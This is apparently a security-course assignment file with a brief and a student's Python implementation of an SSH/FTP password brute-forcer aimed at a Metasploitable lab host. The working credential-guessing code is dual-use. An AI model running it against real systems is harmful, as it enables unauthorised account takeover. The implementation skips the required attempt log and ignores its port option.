"""
================================================================================
COM5413 — The Benji Protocol
Task 3: The Access Validator
File:   brute.py
================================================================================

MISSION BRIEF
-------------
Some doors are locked. Some are locked with the factory default. A good
operative checks quietly, one at a time, without tripping the alarm. Benji
does not kick doors down — he tries the handle first, then tries the spare key,
then the one labelled "admin123" that someone left on a sticky note.

Your job is to build a targeted credential testing tool for SSH and FTP
services. This is a precision instrument, not a battering ram — the mandatory
delay between attempts is not optional, and it is not a courtesy. It is what
separates a professional test from a denial-of-service attack.

WHAT THIS SCRIPT MUST DO
-------------------------
1. Accept target IP, service (ssh/ftp), username, and wordlist path as
   command-line arguments.
2. For FTP: use ftplib to attempt authentication.
3. For SSH: use paramiko to attempt authentication.
4. Iterate through the wordlist, attempting each password in sequence.
5. Include time.sleep(0.1) between each attempt — this is a hard requirement.
6. Stop immediately upon finding valid credentials.
7. Log each attempt (timestamp, username, password tried, result) to a file.

CONSTRAINTS
-----------
- Python 3.10+ only.
- SSH: must use paramiko. FTP: must use ftplib.
- time.sleep(0.1) MUST be present between attempts — auto-grader checks this.
- NO use of the input built-in — all input via argparse.
- Wordlist may contain empty lines and non-ASCII characters — handle both.

OUTPUT CONTRACT (auto-grader depends on this)
---------------------------------------------
On success, print exactly:
    [+] SUCCESS: Password found: <password>

On exhaustion (no valid credentials found), print exactly:
    [-] EXHAUSTED: No valid credentials found for user <username>

EXAMPLE USAGE
-------------
    python brute.py 192.168.56.101 --service ftp --user msfadmin --wordlist rockyou_small.txt
    python brute.py 192.168.56.101 --service ssh --user root --wordlist common_passwords.txt

BUILD LOG
---------
Use docs/build.md to document your testing approach. Record what you observe
when testing against Metasploitable — attempt counts, timing, any connection
drops. This becomes part of your evidence trail.
================================================================================
"""

# Your imports go here
import argparse
import ftplib
import sys
import time
from datetime import datetime
from pathlib import Path
import pyftpdlib

try:
    import paramiko
except ImportError:
    print("[-] paramiko not installed. Run: pip install paramiko", file=sys.stderr)
    sys.exit(1)


def parse_arguments():
    parser = argparse.ArgumentParser(description="Brute force validator")

    parser.add_argument("target", help="Target IP address")

    parser.add_argument("--service", required=True, choices=["ssh", "ftp"])

    parser.add_argument("--user", required=True)

    parser.add_argument("--wordlist", required=True, type=Path)

    parser.add_argument("--port", type=int, default=None)

    return parser.parse_args()


def load_wordlist(wordlist_path: Path) -> list[str]:
    if not wordlist_path.exists():
        raise FileNotFoundError("Wordlist not found")

    with open(wordlist_path, "r", encoding="utf-8", errors="ignore") as f:
        words = []
        for line in f:
            line = line.strip()
            if line:
                words.append(line)

    return words


def attempt_ftp(target: str, user: str, password: str) -> bool:
    try:
        ftp = ftplib.FTP()
        ftp.connect(target, 21, timeout=2)
        ftp.login(user=user, passwd=password)
        ftp.quit()
        return True
    except Exception:
        return False


def attempt_ssh(target: str, user: str, password: str) -> bool:
    try:
        client = paramiko.SSHClient()
        client.set_missing_host_key_policy(paramiko.AutoAddPolicy())

        client.connect(
            hostname=target,
            username=user,
            password=password,
            timeout=2,
            allow_agent=False,
            look_for_keys=False,
        )

        client.close()
        return True

    except Exception:
        return False


def main():
    args = parse_arguments()

    try:
        passwords = load_wordlist(args.wordlist)
    except Exception:
        sys.exit(1)

    for password in passwords:

        time.sleep(0.1)

        if args.service == "ftp":
            success = attempt_ftp(args.target, args.user, password)
        else:
            success = attempt_ssh(args.target, args.user, password)

        if success:
            print(f"[+] SUCCESS: Password found: {password}")
            return

    print(f"[-] EXHAUSTED: No valid credentials found for user {args.user}")

if __name__ == "__main__":
    main()
